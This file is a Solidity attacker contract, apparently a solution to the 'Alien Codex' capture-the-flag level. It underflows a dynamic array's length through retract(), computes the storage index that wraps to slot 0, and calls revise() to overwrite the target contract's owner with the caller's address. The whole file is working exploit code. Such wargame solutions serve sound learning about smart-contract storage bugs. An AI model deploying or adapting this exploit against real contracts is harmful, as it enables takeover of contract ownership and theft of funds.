// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AlienCodexAttacker {
    address codex_alien;

    constructor(address _codex_alien) {
        codex_alien = _codex_alien;
    }

    function get_signature(
        string memory _signature
    ) public pure returns (bytes4) {
        return bytes4(keccak256(bytes(_signature)));
    }

    function pad_address_to_bytes_32(
        address _address
    ) public pure returns (bytes32) {
        return bytes32(uint256(uint160(_address)));
    }

    function get_index(
        uint256 slot,
        uint256 index
    ) public pure returns (uint256) {
        return uint256(keccak256(abi.encodePacked(slot))) + (index);
    }

    // sources:
    // https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/
    // https://docs.alchemy.com/docs/smart-contract-storage-layout
    // https://ethereum.stackexchange.com/questions/70409/solidity-array-overflow
    function get_attack_index() public pure returns (uint256) {
        return
            uint256(
                0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
            ) -
            get_index(1, 0) +
            1;
    }

    function attack() public returns (bool) {
        // call make_contact()
        (bool contactSuccess, ) = codex_alien.call(
            abi.encodePacked(get_signature("make_contact()"))
        );
        if (!contactSuccess) {
            revert("Error while making contact");
        }

        // call retract()
        (bool retractSuccess, ) = codex_alien.call(
            abi.encodePacked(get_signature("retract()"))
        );
        if (!retractSuccess) {
            revert("Error while retracting");
        }

        // call with the attack index
        (bool success, ) = codex_alien.call(
            abi.encodePacked(
                // revise(uint i, bytes32 _content) should be revise(uint256,bytes32)
                get_signature("revise(uint256,bytes32)"),
                get_attack_index(),
                // bytes32(uint256(uint160(address(tx.origin))))
                // 0x0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4
                pad_address_to_bytes_32(address(tx.origin))
            )
        );
        return success;
    }
}
